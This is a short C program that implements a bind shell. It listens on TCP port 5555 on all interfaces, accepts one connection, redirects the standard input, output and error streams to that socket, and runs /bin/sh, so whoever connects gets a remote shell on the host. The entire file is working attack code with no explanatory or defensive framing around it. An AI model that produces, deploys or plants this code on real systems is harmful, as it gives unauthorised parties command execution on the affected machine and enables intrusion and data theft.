#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(int argc, char const *argv[])
{
	int sockfd;
	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		printf("[ Error ] Creation of the socket failed\n");
		return -1;
	}

	// Get rid of the 'Address already in use' error from bind(), which is
	// cause by the socket being in TIME_WAIT state after the program is done
	int yes = 1;
	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes)) == -1) {
		printf("[ Error ] Failed to set SO_REUSEADDR option to socket\n");
		return -1;
	}

	struct sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = INADDR_ANY;
	server_addr.sin_port = htons(5555);

	if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
		perror("[ Error ] At bind syscall");
		return -1;
	}

	if (listen(sockfd, 1) == -1) {
		printf("[ Error ] When listening for incoming connections\n");
		return -1;
	}

	int client_sockfd;
	struct sockaddr_in client_addr;
	client_addr.sin_family = AF_INET;
	socklen_t client_addr_size = sizeof(struct sockaddr_in);

	if ((client_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &client_addr_size)) == -1) {
		printf("[ Error ] When accepting connection\n");
		return -1;
	}

	printf("[ INFO ] (%s, %d) connected! \n", inet_ntoa(client_addr.sin_addr), client_addr.sin_port);
	fflush(stdout);

	// Duplicate the standard file descriptors
	for (int i = 0; i < 3; ++i) {
		if (dup2(client_sockfd, i) == -1) {
			printf("[ Error ] Could not duplicate the standard file descriptors to socket\n");
			return -1;
		}
	}

	char *const args[] = {"/bin/sh", NULL};
	execve("/bin/sh", args, NULL);
	printf("[ Error ] execve call failed!\n");

	return 0;
}
